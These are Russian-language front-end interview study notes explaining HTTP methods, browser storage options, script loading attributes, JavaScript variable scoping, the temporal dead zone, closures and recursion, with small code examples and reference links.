До сих пор мы рассматривали сервер как единую сущность. Но его структура куда сложнее. Между ним и клиентом есть несколько промежуточных узлов, выполняющих вспомогательные функции, — **прокси-серверы**.

Они используются для кэширования, обеспечения безопасности, дополнительной обработки данных. Если основных серверов несколько, то дополнительные серверы-балансировщики могут распределять нагрузку между ними и решать, в какой из них направлять запрос:

![](https://skillbox.ru/upload/setka_images/09194607122022_bd473197c461193ea9b6d317f4c236910d065887.png)

_Изображение: Майя Мальгина для Skillbox Media_

Никто из участников цепочки не знает всего пути, который проходит запрос, — только своих «соседей» справа и слева. Ни клиент, ни один из прокси-серверов не знает, к кому он обращается — к основному сервису или к другому прокси. В REST API это работает в обе стороны: никакие серверы (ни основные, ни прокси) не знают, кому отправляют ответ и уходит ли он куда-то дальше.

###### **Код по требованию (необязательно)**

Этот принцип означает, что сервер в ответ на запрос может **отправить исходный код**, который выполняется уже на стороне клиента. Благодаря этому можно передавать целые сценарии. Например, динамические элементы пользовательского интерфейса, написанные на JavaScript.

В REST API требование необязательно, потому что не всем сайтам и сервисам нужно умение работать с готовыми скриптами.


##### graph QL

https://graphql.org/
https://habr.com/ru/articles/765064/
https://gitconnected.com/learn/graphql

##### GET/POST/PUT/DELETE?PATCH

Вот объяснение основных HTTP-методов (**GET, POST, PUT, DELETE, PATCH**) с примерами и сравнением:

---

###### **1. GET (Чтение данных)**
**Для чего:** Запрос данных с сервера (без изменений).  
**Характеристики:**
- Безопасный (не меняет состояние сервера)
- Идемпотентный (повторные запросы дают тот же результат)
- Данные передаются в URL (ограничение длины)
- Кэшируется браузером

**Пример:**  
```http
GET /api/users/123 HTTP/1.1
```
**Ответ:** Данные пользователя с ID 123.

---

###### **2. POST (Создание данных)**
**Для чего:** Отправка данных на сервер (создание нового ресурса).  
**Характеристики:**
- Небезопасный (меняет состояние сервера)
- Неидемпотентный (повторный запрос создаст дубликат)
- Данные передаются в теле запроса (нет ограничения длины)
- Не кэшируется

**Пример:**  
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{"name": "John", "age": 30}
```
**Ответ:** Созданный пользователь с ID 456.

---

###### **3. PUT (Полное обновление)**
**Для чего:** Замена всего ресурса новыми данными.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторный запрос не изменит результат)
- Требует отправки всех полей ресурса

**Пример:**  
```http
PUT /api/users/123 HTTP/1.1
Content-Type: application/json

{"name": "John Updated", "age": 35}
```
**Ответ:** Обновленные данные пользователя (все поля перезаписаны).

---

###### **4. DELETE (Удаление)**
**Для чего:** Удаление ресурса.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторные запросы не изменят результат после первого удаления)

**Пример:**  
```http
DELETE /api/users/123 HTTP/1.1
```
**Ответ:** Код 204 (No Content) при успехе.

---

###### **5. PATCH (Частичное обновление)**
**Для чего:** Изменение отдельных полей ресурса.  
**Характеристики:**
- Небезопасный
- Неидемпотентный (зависит от реализации)
- Отправляются только изменяемые поля

**Пример:**  
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{"age": 40}
```
**Ответ:** Обновленный ресурс (только поле `age` изменено).

---

###### **Сравнение методов**
| Метод   | Идемпотентность | Безопасность | Тело запроса | Использование           |
|---------|-----------------|--------------|--------------|-------------------------|
| GET     | Да              | Да           | Нет          | Получение данных        |
| POST    | Нет             | Нет          | Да           | Создание ресурса        |
| PUT     | Да              | Нет          | Да           | Полная замена ресурса   |
| DELETE  | Да              | Нет          | Нет/Да       | Удаление ресурса        |
| PATCH   | Нет*            | Нет          | Да           | Частичное обновление    |

> *PATCH может быть идемпотентным, если изменения предсказуемы (например, установка значения `age=40`).

---

###### **Когда что использовать?**
- **GET:** Для получения данных (списка пользователей, деталей товара).  
- **POST:** Для создания (новый пользователь, отправка формы).  
- **PUT:** Для полного обновления (замена профиля пользователя).  
- **PATCH:** Для изменения одного поля (например, смена email).  
- **DELETE:** Для удаления (удаление пользователя).

---

###### **Примеры REST API**
```http
GET    /api/books       — список всех книг
POST   /api/books       — добавить новую книгу
GET    /api/books/42    — получить книгу с ID 42
PUT    /api/books/42    — полностью обновить книгу 42
PATCH  /api/books/42    — изменить автора книги 42
DELETE /api/books/42    — удалить книгу 42
```

**Важно:**  
- Для PATCH используйте формат JSON Patch (`Content-Type: application/json-patch+json`), если API поддерживает.  
- PUT и PATCH часто путают: PUT = перезапись всего, PATCH = точечное изменение.

##### Объясните разницу между `cookie`, `sessionStorage` и `localStorage`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-cookie-sessionstorage-%D0%B8-localstorage "Прямая ссылка на объясните-разницу-между-cookie-sessionstorage-и-localstorage")

###### Ссылки[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8-5 "Прямая ссылка на Ссылки")

- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [http://tutorial.techaltum.com/local-and-session-storage.html](http://tutorial.techaltum.com/local-and-session-storage.html)

Вот сравнение **cookie**, **sessionStorage** и **localStorage** — трех основных способов хранения данных в браузере:

---

###### **1. Куки (Cookie)**  
**Хранение:**  
- Сохраняются **на клиенте и сервере** (передаются с каждым HTTP-запросом в заголовках).  
- Объем: **~4 КБ** на домен.  

**Срок жизни:**  
- Задается вручную (например, `expires=Mon, 01-Jan-2024 12:00:00 GMT`).  
- Могут быть **сессионными** (удаляются при закрытии браузера).  

**Доступ:**  
- Через `document.cookie` (строку в формате `key=value`).  
- Сервер может читать/устанавливать куки (заголовки `Set-Cookie` и `Cookie`).  

**Пример:**  
```javascript
// Установка
document.cookie = "username=John; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";

// Чтение
console.log(document.cookie); // "username=John; theme=dark"
```

**Когда использовать:**  
- Для аутентификации (токены).  
- Персонализация (темы, языковые настройки).  

---

###### **2. sessionStorage**  
**Хранение:**  
- Только **на клиенте** (данные не отправляются на сервер).  
- Объем: **~5–10 МБ** на домен (зависит от браузера).  

**Срок жизни:**  
- Удаляется при **закрытии вкладки/браузера**.  

**Доступ:**  
- Через API: `sessionStorage.setItem()`, `sessionStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
sessionStorage.setItem('theme', 'dark');

// Чтение
console.log(sessionStorage.getItem('theme')); // "dark"
```

**Когда использовать:**  
- Временные данные для текущей сессии (например, форма с многостраничным вводом).  

---

###### **3. localStorage**  
**Хранение:**  
- Только **на клиенте** (как `sessionStorage`, но без привязки к сессии).  
- Объем: **~5–10 МБ** на домен.  

**Срок жизни:**  
- Сохраняется **навсегда**, пока не будет очищен вручную или через код.  

**Доступ:**  
- Аналогичен `sessionStorage`: `localStorage.setItem()`, `localStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
localStorage.setItem('language', 'ru');

// Чтение
console.log(localStorage.getItem('language')); // "ru"
```

**Когда использовать:**  
- Постоянные настройки пользователя (тема, язык).  
- Кэширование данных для оффлайн-работы.  

---

###### **Сравнительная таблица**
| Характеристика       | Cookie                  | sessionStorage         | localStorage          |
|----------------------|-------------------------|------------------------|-----------------------|
| **Объем**           | ~4 КБ                  | 5–10 МБ               | 5–10 МБ              |
| **Срок жизни**      | Задается вручную       | До закрытия вкладки    | Бессрочно            |
| **Доступ с сервера**| Да (через заголовки)   | Нет                    | Нет                  |
| **API**             | `document.cookie`       | `sessionStorage`       | `localStorage`       |
| **Использование**   | Аутентификация         | Временные данные       | Постоянные данные    |

---

###### **Как выбрать?**  
1. **Нужно отправить данные на сервер?** → `cookie`.  
2. **Хранить данные только в текущей вкладке?** → `sessionStorage`.  
3. **Сохранить настройки пользователя надолго?** → `localStorage`.  

**Важно:**  
- Для безопасности **не храните** пароли/токены в `localStorage` (уязвимо для XSS-атак).  
- Для больших данных (например, кэша) используйте **IndexedDB**.
##### Объясните разницу между `<script>`, `<script async>` и `<script defer>`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-script-script-async-%D0%B8-script-defer "Прямая ссылка на объясните-разницу-между-script-script-async-и-script-defer")

https://developer.mozilla.org/ru/docs/Web/HTML/Reference/Elements/script

https://learn.javascript.ru/script-async-defer

- `<script>` - отрисовка HTML блокируется, скрипт извлекается и выполняется немедленно, отрисовка HTML возобновляется после окончания выполнения скрипта.
- `<script async>` - скрипт будет получен и обработан параллельно с отрисовкой HTML, его выполнение закончится как только это будет возможно (обычно до того, как закончилась отрисовка HTML). Используйте `async` тогда, когда скрипт не зависит от других скриптов на странице, например для аналитики.
- `<script defer>` - скрипт будет получен параллельно с отрисовкой HTML, его выполнение произойдет после того, как вся страница будет загружена. Если таких скриптов несколько, то каждый из них будет исполнятся в том порядке, в котором они расположены в документе. Если скрипту нужен полностью распарсеный DOM, то атрибут `defer` обеспечит уверенность в том, что на момент отработки скрипта весь HTML отрисован. Нет особой разницы со скриптами, расположенными перед тегом `<body>`. Отложенный скрипт не должен содержать `document.write`.

Примечание: Атрибуты `async` и `defer` игнорируются, если у тега `<script>` нет атрибута `src`.

Вот подробное сравнение атрибутов **`async`** и **`defer`** для загрузки скриптов в HTML:

---

###### **1. Обычная загрузка скрипта (без атрибутов)**
```html
<script src="script.js"></script>
```
**Поведение:**
- Браузер **останавливает парсинг HTML**, пока скрипт не загрузится и не выполнится.
- **Блокирующий** процесс рендеринга страницы.

**Когда использовать:**  
Если скрипт критически важен для отображения контента (например, полифиллы для старых браузеров).

---

###### **2. Атрибут `async` (асинхронная загрузка)**
```html
<script async src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Как только скрипт загружен, он **немедленно выполняется**, приостанавливая парсинг HTML.
3. **Порядок выполнения**: Не гарантируется (кто загрузился первым, тот и выполнился).

**Когда использовать:**  
Для независимых скриптов, которые не требуют взаимодействия с DOM (например, аналитика, счетчики).

**Пример:**  
```html
<!-- Google Analytics -->
<script async src="https://www.google-analytics.com/analytics.js"></script>
```

---

###### **3. Атрибут `defer` (отложенная загрузка)**
```html
<script defer src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Выполняется **после полной загрузки HTML**, перед событием `DOMContentLoaded`.
3. **Порядок выполнения**: Сохраняется (скрипты выполняются в том порядке, в котором объявлены в HTML).

**Когда использовать:**  
Для скриптов, которым нужен доступ к DOM, но которые могут ждать загрузки всей страницы (например, инициализация виджетов).

**Пример:**  
```html
<script defer src="app.js"></script>
<script defer src="widget.js"></script> 
<!-- Гарантировано выполнится после app.js -->
```

---

###### **Сравнительная таблица**
| Характеристика      | Без атрибутов       | `async`                     | `defer`                     |
|---------------------|---------------------|-----------------------------|-----------------------------|
| **Загрузка**        | Блокирует HTML      | Параллельная                | Параллельная                |
| **Выполнение**      | Сразу после загрузки| Сразу после загрузки        | После загрузки HTML         |
| **Порядок**         | По порядку в HTML   | Случайный (кто первый)      | По порядку в HTML           |
| **Влияние на рендер**| Блокирует          | Может блокировать           | Не блокирует               |
| **Использование**   | Критичные скрипты   | Независимые скрипты         | Скрипты, зависящие от DOM  |

---

###### **Как выбрать?**
1. **`async`** – если скрипт **не зависит от DOM** и других скриптов (аналитика, реклама).  
2. **`defer`** – если скрипту **нужен DOM**, но он может подождать (основной код приложения).  
3. **Без атрибутов** – только для скриптов, которые должны выполниться **до отображения страницы** (например, полифиллы).

---

###### **Визуализация загрузки**
```
HTML Parsing: |=============================|
Без атрибутов:   |----загрузка----|выполнение|
async:            |----загрузка----|выполнение| (в случайном порядке)
defer:            |----загрузка----|       |выполнение| (после HTML, по порядку)
```

---

###### **Важно!**
- Для **модульных скриптов** (ES6) используйте `<script type="module">` – они по умолчанию работают как `defer`.
- **Старайтесь избегать** блокирующих скриптов без `async/defer` – они замедляют загрузку страницы.
## JS

##### переменные/ let/const/var
https://doka.guide/js/var-let/
https://learn.javascript.ru/variables#itogo
https://learn.javascript.ru/var

###### **1. Область видимости (Scope)**
|           | `var`                  | `let`/`const`          |
|-----------|------------------------|------------------------|
| **Область** | Function-scoped       | Block-scoped          |
| **Доступ** | Видна во всей функции | Только внутри блока `{}` |

**Пример:**
```javascript
function test() {
  if (true) {
    var a = 1;    // Видна во всей функции
    let b = 2;    // Только внутри if
    const c = 3;  // Только внутри if
  }
  console.log(a); // 1
  console.log(b); // Ошибка: b is not defined
}
```

---

###### **2. Поднятие (Hoisting)**
|           | `var`                  | `let`/`const`          |
|-----------|------------------------|------------------------|
| **Поднятие** | Да (с `undefined`)    | Да (но в "TDZ")       |
| **TDZ**   | Нет                    | Есть (временная мёртвая зона) |

**Пример:**
```javascript
console.log(x); // undefined (var поднято)
var x = 10;

console.log(y); // Ошибка: Cannot access 'y' before initialization
let y = 20;
```

---

###### **3. Переопределение и обновление**
|           | `var`       | `let`       | `const`     |
|-----------|-------------|-------------|-------------|
| **Переопределение** | Можно      | Можно       | Нельзя      |
| **Обновление**   | Можно      | Можно       | Можно*      |

**Пример:**
```javascript
var name = "John";
var name = "Anna"; // OK

let age = 30;
let age = 40; // Ошибка: Identifier 'age' already declared

const pi = 3.14;
pi = 3.1415; // Ошибка: Assignment to constant variable
```
> *`const` запрещает переприсваивание, но можно менять свойства объектов/массивов:
> ```javascript
> const user = { name: "John" };
> user.name = "Anna"; // OK
> ```

---

###### **4. Глобальная видимость**
При объявлении в глобальной области:
- `var` создаёт свойство в `window` (браузер).
- `let`/`const` не добавляются в `window`.

**Пример:**
```javascript
var globalVar = "I'm global";
let globalLet = "I'm global too";

console.log(window.globalVar); // "I'm global"
console.log(window.globalLet); // undefined
```

---

###### **Когда что использовать?**
1. **`const`** – по умолчанию для всех переменных, которые не нужно переопределять.
2. **`let`** – если переменная будет изменяться (счётчики, условия в циклах).
3. **`var`** – почти никогда (устаревший вариант, есть только для обратной совместимости).

**Примеры:**
```javascript
// Хороший стиль:
const API_URL = "https://api.example.com"; // Константа
let isLoading = true;                      // Флаг, который будет меняться

// Плохой стиль:
var counter = 0;                          // Устаревший синтаксис
```

---

###### **Сводная таблица**
| Характеристика       | `var`            | `let`            | `const`          |
|----------------------|------------------|------------------|------------------|
| **Область видимости** | Function-scoped  | Block-scoped     | Block-scoped     |
| **Поднятие**         | Да (с undefined) | Да (в TDZ)       | Да (в TDZ)       |
| **Переопределение**  | Да               | Нет              | Нет              |
| **Изменение значения** | Да              | Да               | Нет*             |
| **Глобальная видимость** | Добавляет в `window` | Не добавляет в `window` | Не добавляет в `window` |

> *Для объектов/массивов, объявленных через `const`, можно менять внутренние свойства.

---

###### **Почему `var` устарел?**
1. **Неочевидная область видимости** (видна во всей функции, а не только в блоке).
2. **Поднятие** может приводить к неожиданным ошибкам.
3. **Загрязнение глобального объекта** (`window` в браузерах).

**Плохой пример с `var`:**
```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Выведет 3, 3, 3 (из-за function-scoped)
}
// С let выведет 0, 1, 2
```

---

###### **Итог**
- Всегда начинайте с `const`.  
- Используйте `let`, если переменная будет меняться.  
- Избегайте `var` в современном коде.  
- Для объектов/массивов, которые нужно защитить от изменений, используйте `Object.freeze()`:
  ```javascript
  const immutableObj = Object.freeze({ key: 'value' });
  immutableObj.key = 'new'; // Не изменится (в strict mode — ошибка)
  ```

##### **TDZ (Temporal Dead Zone, Временная мёртвая зона)**  

**TDZ** — это период времени, когда переменные `let` и `const` уже существуют в области видимости (благодаря **поднятию**, Hoisting), но к ним **нельзя обратиться** до их объявления.  

---

###### **Как работает TDZ?**
1. **Объявление `let`/`const` поднимается (hoisting)** в начало своей области видимости (блока `{}`).  
2. Но переменная остаётся в **TDZ** до момента её **инициализации** (присваивания значения).  
3. При попытке доступа к переменной в TDZ — **ошибка `ReferenceError`**.  

---

###### 1. Простой пример
```javascript
console.log(x); // ReferenceError: Cannot access 'x' before initialization
let x = 10;
```
- Переменная `x` **поднята**, но находится в TDZ до строки `let x = 10`.  

###### 2. Внутри блока `{}`
```javascript
{
  console.log(y); // ReferenceError: y is not defined
  let y = 20;
}
```
- `y` существует только внутри блока, но до объявления — TDZ.  

###### 3. В цикле
```javascript
for (let i = 0; i < 3; i++) {
  console.log(i); // 0, 1, 2 (нет TDZ, так как i уже инициализирована)
}
```
- В отличие от `var`, `let` в цикле **не выходит за его пределы**.  

---

###### **Чем TDZ отличается от `var`?**
| Особенность      | `var`                          | `let`/`const` (TDZ)          |
|------------------|--------------------------------|-----------------------------|
| **Поднятие**     | Да, с `undefined`              | Да, но нельзя использовать  |
| **Область**      | Function-scoped                | Block-scoped                |
| **Доступ до объявления** | `undefined`            | **Ошибка `ReferenceError`** |

**Пример:**
```javascript
console.log(a); // undefined (var поднят)
var a = 5;

console.log(b); // ReferenceError (let в TDZ)
let b = 10;
```

---

###### **Почему TDZ существует?**
1. **Предотвращение ошибок** — нельзя использовать переменную до её объявления.  
2. **Улучшение отладки** — явная ошибка лучше, чем неожиданное `undefined`.  
3. **Строгая блоковая область видимости** — `let`/`const` ведут себя предсказуемо.  

---

###### **Как избежать TDZ?**
1. **Всегда объявляйте переменные в начале блока**:
   ```javascript
   let x = 10; // Инициализация перед использованием
   console.log(x); // 10
   ```
2. **Не используйте `var`** — он не имеет TDZ, но приводит к путанице.  
3. **Для `const` — всегда задавайте начальное значение**:
   ```javascript
   const PI = 3.14; // Без TDZ, т.к. сразу инициализирована
   ```

---

###### **Примеры, где TDZ важен**
###### 1. В функциях
```javascript
function run() {
  console.log(value); // ReferenceError (TDZ)
  let value = "Hello";
}
run();
```

###### 2. В блоках `if`/`for`
```javascript
if (true) {
  console.log(tmp); // ReferenceError (TDZ)
  let tmp = 123;
}
```

---

###### **Вывод**
- **TDZ** — это механизм, который делает `let`/`const` безопаснее `var`.  
- **Всегда инициализируйте переменные до использования**, чтобы избежать ошибок.  
- **`const` должен иметь значение сразу**, `let` — лучше объявлять заранее.  

**Итоговая таблица:**  

| Особенность         | `var`            | `let`        | `const`      |
| ------------------- | ---------------- | ------------ | ------------ |
| **Поднятие**        | Да (`undefined`) | Да (TDZ)     | Да (TDZ)     |
| **Область**         | Function-scoped  | Block-scoped | Block-scoped |
| **TDZ**             | Нет              | Да           | Да           |
| **Переопределение** | Да               | Нет          | Нет          |
##### В чём разница между `null`, `undefined` и объявленной переменной без начального значения? (`let foo;`)

`null` задаётся переменной явно и означает, что она является объектом, но структура этого объекта ещё не определена. `undefined` присваивается переменной (переменная не декларирует объект), когда она была объявлена, но не было определено её начальное значение. Функция может возвращать `undefined` или `null`. Всё зависит от того, что мы ожидаем в результате работы функции. Если мы ожидаем объект, но по каким-то причинам функция его вернуть не может, то возвращаем `null`. Если функция должна вернуть, например, число (главное, не объект), но не может этого сделать, то она возвращает `undefined`.

Без начального значения можно оставлять только переменную, объявленную через `let` или `var`. Если объявить переменную через `const` и не задать ей начального значения, будет ошибка: `Uncaught SyntaxError: Missing initializer in const declaration`.

Поговорим немного о [приведении типов](https://doka.guide/js/typecasting/). Для начала, пример:

```js

console.log(null + null); // 0
console.log(undefined + undefined); // NaN

```

Почему так?

По [спецификации EcmaScript](https://262.ecma-international.org/7.0/#sec-tonumber)

- `null` во время сложения приводится к нулю;
- `undefined` во время сложения приводится к `NaN`. `NaN` это аббревиатура от "not a number" — не число. Результат арифметической операции равен `NaN`, если во время операции произошла ошибка и ожидаемый числовой результат не может быть выражен числом.

Есть ещё один хитрый пример:

```js

console.log(null + []); // "null"

```

Почему так?

Подсказка, почему так, кроется именно в типе результате: "null" — строка. А не примитивное значение `null`.

JavaScript сначала приводит массив к примитивному значению. Для этого вызывается метод `toString()`, который вызывает метод `join()`. Т.к. массив пустой, то `join()` вернёт пустую строку `""`. А сложение чего-то со строкой в JS возвращает строку. Поэтому `null` уже никуда не приводится, а возращается строка `"null"`.

Немного упомяну и про оператор нулевого слияния (`??`). В выражении между двумя операндами он будет возвращать первый операнд, если он не равен `null` или `undefined`. Можно сказать, что `??` приравнивает смысл `undefined` и `null` к «ничего не содержит», и, в этом случае, кладёт в переменную значение второго операнда.
##### **Замыкания (Closures) в JavaScript**
https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BC%D1%8B%D0%BA%D0%B0%D0%BD%D0%B8%D0%B5_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)
https://learn.javascript.ru/closure
https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Closures

Замыкание — это комбинация **функции** и **лексического окружения**, в котором эта функция была объявлена. Оно позволяет функции **запоминать и получать доступ** к переменным из внешней (родительской) области видимости, даже после того, как родительская функция завершила выполнение.

###### 🔹 **Как работают замыкания?**
1. **Функция внутри функции**  
   Внутренняя функция "запоминает" (имеет доступ к) переменные внешней функции.

2. **Сохранение состояния**  
   Даже после завершения внешней функции, её переменные остаются доступными для внутренней.

---

###### 🔹 **Пример замыкания**
```javascript
function outer() {
  let count = 0; // Локальная переменная внешней функции

  function inner() {
    count++; // Внутренняя функция использует переменную из внешней
    console.log(count);
  }

  return inner; // Возвращаем inner (но не вызываем её!)
}

const counter = outer(); // counter = функция inner + запомненное окружение (count)

counter(); // 1 (count = 0 + 1)
counter(); // 2 (count = 1 + 1)
counter(); // 3 (count = 2 + 1)
```

###### **Что произошло?**
1. `outer()` вызывается и возвращает `inner`.  
2. Переменная `count` **не уничтожается**, потому что `inner` сохраняет ссылку на неё.  
3. Каждый вызов `counter()` изменяет **одну и ту же `count`**.

---

###### 🔹 **Где применяются замыкания?**
###### **1. Создание приватных переменных**
```javascript
function createCounter() {
  let value = 0; // "Приватная" переменная

  return {
    increment() { value++; },
    decrement() { value--; },
    getValue() { return value; }
  };
}

const counter = createCounter();
counter.increment();
console.log(counter.getValue()); // 1
console.log(counter.value); // undefined (нельзя получить напрямую)
```
- `value` нельзя изменить извне, только через методы.

###### **2. Каррирование (частичное применение функций)**
```javascript
function multiply(a) {
  return function(b) {
    return a * b;
  };
}

const double = multiply(2);
console.log(double(5)); // 10 (2 * 5)
```

###### **3. Мемоизация (кэширование результатов)**
```javascript
function memoizedAdd() {
  const cache = {}; // Замыкание сохраняет cache между вызовами

  return function(n) {
    if (n in cache) {
      console.log("Из кэша:", cache[n]);
      return cache[n];
    } else {
      console.log("Вычисление...");
      cache[n] = n + 10;
      return cache[n];
    }
  };
}

const add = memoizedAdd();
console.log(add(5)); // Вычисление... 15
console.log(add(5)); // Из кэша: 15
```

---

###### 🔹 **Как избежать утечек памяти?**
Замыкания сохраняют ссылки на внешние переменные, что может приводить к утечкам памяти, если:
- Объект больше не нужен, но функция внутри замыкания держит ссылку на него.

**Решение:**  
- Явно обнулять ссылки (`someVar = null`).  
- Использовать **WeakMap** или **WeakSet**, если нужно хранить объекты.

---

###### 🔹 **Итог**
✅ **Замыкания** позволяют функциям запоминать внешние переменные.  
✅ Полезны для **приватных данных**, **каррирования**, **мемоизации**.  
⚠️ Могут вызывать **утечки памяти**, если неаккуратно использовать.  

**Пример на практике:**
```javascript
function createTimer() {
  let startTime = Date.now();

  return function() {
    return Date.now() - startTime;
  };
}

const getElapsedTime = createTimer();
setTimeout(() => console.log(getElapsedTime()), 1000); // ~1000 мс
```


[Замыкание](https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BC%D1%8B%D0%BA%D0%B0%D0%BD%D0%B8%D0%B5_\(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5\)) – это функция, которая запоминает свои внешние переменные и может получить к ним доступ. В некоторых языках это невозможно, или функция должна быть написана специальным образом, чтобы получилось замыкание. Но, как было описано выше, в JavaScript, все функции изначально являются замыканиями (есть только одно исключение, про которое будет рассказано в [Синтаксис "new Function"](https://learn.javascript.ru/new-function)).

То есть они автоматически запоминают, где были созданы, с помощью скрытого свойства `[[Environment]]`, и все они могут получить доступ к внешним переменным.

Когда на собеседовании фронтенд-разработчику задают вопрос: «что такое замыкание?», – правильным ответом будет определение замыкания и объяснения того факта, что все функции в JavaScript являются замыканиями, и, может быть, несколько слов о технических деталях: свойстве `[[Environment]]` и о том, как работает лексическое окружение.

Замыкание — это комбинация функции и лексического окружения, в котором эта функция была определена. Другими словами, замыкание даёт вам доступ к [Scope](https://developer.mozilla.org/en-US/docs/Glossary/Scope) внешней функции из внутренней функции. В JavaScript замыкания создаются каждый раз при создании функции, во время её создания.
##### рекурсия
https://learn.javascript.ru/recursion
https://doka.guide/js/recursion/

Рекурсия — это процесс, когда **функция вызывает саму себя** до тех пор, пока не достигнет **базового случая** (условия выхода). Это мощный инструмент для решения задач, которые можно разбить на более мелкие подзадачи того же типа.

###### 🔹 **Как работает рекурсия?**
1. **Рекурсивный случай** — функция вызывает саму себя с изменёнными аргументами.
2. **Базовый случай** — условие, при котором рекурсия останавливается.

###### 🔥 **Простой пример: Факториал**
```javascript
function factorial(n) {
  if (n === 1) return 1; // Базовый случай
  return n * factorial(n - 1); // Рекурсивный вызов
}

console.log(factorial(5)); // 120 (5! = 5 * 4 * 3 * 2 * 1)
```

###### **Что происходит?**
1. `factorial(5)` → `5 * factorial(4)`
2. `factorial(4)` → `4 * factorial(3)`
3. `factorial(3)` → `3 * factorial(2)`
4. `factorial(2)` → `2 * factorial(1)`
5. `factorial(1)` → `1` (базовый случай, рекурсия останавливается)

---

###### 🔹 **Где применяется рекурсия?**
###### **1. Обход древовидных структур (DOM, JSON)**
```javascript
function traverseDOM(node) {
  console.log(node.tagName); // Выводим текущий элемент
  for (const child of node.children) {
    traverseDOM(child); // Рекурсивно обходим детей
  }
}

traverseDOM(document.body); // Обход всего DOM
```

###### **2. Алгоритмы (быстрая сортировка, бинарный поиск)**
```javascript
function binarySearch(arr, target, left = 0, right = arr.length - 1) {
  if (left > right) return -1; // Базовый случай: элемент не найден
  
  const mid = Math.floor((left + right) / 2);
  
  if (arr[mid] === target) return mid; // Нашли элемент
  if (arr[mid] < target) return binarySearch(arr, target, mid + 1, right);
  return binarySearch(arr, target, left, mid - 1);
}

const arr = [1, 3, 5, 7, 9];
console.log(binarySearch(arr, 5)); // 2 (индекс элемента)
```

###### **3. Генерация последовательностей (числа Фибоначчи)**
```javascript
function fibonacci(n) {
  if (n <= 1) return n; // Базовый случай
  return fibonacci(n - 1) + fibonacci(n - 2);
}

console.log(fibonacci(6)); // 8 (0, 1, 1, 2, 3, 5, 8)
```

---

###### 🔹 **Проблемы рекурсии и как их избежать**
###### **1. Переполнение стека (Stack Overflow)**
Если рекурсия слишком глубокая, JavaScript выдаст ошибку:
```javascript
function infiniteRecursion() {
  infiniteRecursion(); // Бесконечный вызов → RangeError
}
```

**Решение:**  
- Использовать **хвостовую рекурсию** (если движок её поддерживает).  
- Переписать алгоритм **итеративно** (через циклы).

###### **2. Медленная работа (например, Фибоначчи)**
Рекурсивный Фибоначчи без оптимизации работает за **O(2ⁿ)**.

**Решение:** **Мемоизация** (кэширование результатов).  
```javascript
const memo = {};

function fibonacciMemo(n) {
  if (n <= 1) return n;
  if (memo[n]) return memo[n]; // Возвращаем кэшированный результат
  
  memo[n] = fibonacciMemo(n - 1) + fibonacciMemo(n - 2);
  return memo[n];
}

console.log(fibonacciMemo(50)); // Быстро, даже для больших n
```

---

###### 🔹 **Рекурсия vs Итерация**
| Критерий          | Рекурсия                  | Итерация (циклы)          |
|-------------------|---------------------------|---------------------------|
| **Читаемость**    | Выше (для некоторых задач)| Ниже                      |
| **Производительность** | Может быть медленнее | Обычно быстрее            |
| **Использование памяти** | Заполняет стек вызовов | Использует меньше памяти  |
| **Где применять** | Деревья, вложенные структуры | Простые линейные задачи |

---

###### 🔹 **Итог**
✅ **Рекурсия** полезна для задач с **вложенной структурой** (деревья, графы).  
⚠️ **Без базового случая** приводит к **бесконечной рекурсии**.  
🚀 **Оптимизация:** мемоизация, хвостовая рекурсия, итеративные решения.  

**Пример хвостовой рекурсии (ES6):**
```javascript
function factorialTail(n, acc = 1) {
  if (n === 1) return acc;
  return factorialTail(n - 1, n * acc); // Хвостовой вызов (оптимизируется в некоторых движках)
}
```

##### this
https://doka.guide/js/function-context/
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this
https://learn.javascript.ru/object-methods
https://habr.com/ru/companies/ruvds/articles/419371/
https://docs.google.com/presentation/d/1LDJMSHmTkrYYdXQCinUIAQ9BMV2jIrctHhMfGSJDlXQ/edit?slide=id.g23ce763670e_0_2#slide=id.g23ce763670e_0_2


##### event loop
https://habr.com/ru/articles/762618/
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Execution_model
https://habr.com/ru/companies/otus/articles/801249/
https://www.youtube.com/watch?v=eiC58R16hb8

##### методы массивов
https://learn.javascript.ru/array-methods
https://habr.com/ru/companies/plarium/articles/483958/
https://doka.guide/js/arrays/
##### Promise

##### статические методы promise

##### прототипное насследноваие

##### DOM

##### события

##### всплытие/погружение

##### делегирование событий

##### объект события

##### this/currentTarget vs target

##### логические операторы

##### Map, Set, WeakMap, WeakSet

##### каррирование

##### webworkers

##### стрелочные функции, function declaration/expression

##### Опциональная цепочка '?.'

##### call/apply/bind

  

## TS

  

